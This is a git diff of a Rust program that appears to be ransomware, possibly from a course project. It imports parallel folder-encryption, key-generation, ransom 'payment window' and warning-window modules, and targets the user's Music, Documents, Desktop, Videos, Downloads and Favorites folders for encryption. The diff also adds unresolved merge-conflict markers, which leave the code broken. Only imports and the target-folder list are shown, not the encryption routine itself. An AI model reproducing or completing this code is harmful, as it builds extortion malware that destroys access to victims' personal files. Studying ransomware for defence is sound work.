@@ -7,9 +7,15 @@ use std::path::PathBuf;
 use anyhow::Result;
 
 // use c_monster_co_2ic80::cryptography::encrypt::encrypt_folder;
+<<<<<<<<< Temporary merge branch 1
+use c_monster_co_2ic80::cryptography::parallel_encrypt::encrypt_folder_parallel;
+use c_monster_co_2ic80::debug_log;
+use c_monster_co_2ic80::cryptography::chunk::{DEBUG_ENABLED};
+=========
 use c_monster_co_2ic80::cryptography::chunk::DEBUG_ENABLED;
 use c_monster_co_2ic80::cryptography::parallel_encrypt::encrypt_folder_parallel;
 use c_monster_co_2ic80::debug_log;
+>>>>>>>>> Temporary merge branch 2
 use c_monster_co_2ic80::networking::client::gen_key;
 use c_monster_co_2ic80::gui::payment::show_payment_window;
 use c_monster_co_2ic80::gui::warning::show_warning_window;
@@ -19,7 +25,11 @@ use sodiumoxide::crypto::box_::PublicKey;
 
 use windows::{
     Win32::UI::Shell::{
+<<<<<<<<< Temporary merge branch 1
+        FOLDERID_Desktop, FOLDERID_Documents, FOLDERID_Music, FOLDERID_Videos, KNOWN_FOLDER_FLAG,
+=========
         FOLDERID_Desktop, FOLDERID_Documents, FOLDERID_Music, FOLDERID_Videos, FOLDERID_Downloads, FOLDERID_Favorites, KNOWN_FOLDER_FLAG,
+>>>>>>>>> Temporary merge branch 2
         SHGetKnownFolderPath,
     },
     core::PWSTR,
@@ -70,12 +80,20 @@ async fn run_encryption() -> Result<(), Box<dyn std::error::Error>> {
     let paths = [
         FOLDERID_Music,
         FOLDERID_Documents,
+<<<<<<<<< Temporary merge branch 1
+        FOLDERID_Desktop,
+        FOLDERID_Videos,
+    ];
+
+    show_warning_window();
+=========
         FOLDERID_Downloads,
         // FOLDERID_Desktop,
         FOLDERID_Favorites,
         FOLDERID_Videos,
         FOLDERID_Downloads,
     ];
+>>>>>>>>> Temporary merge branch 2
 
     unsafe {
         for path in paths {
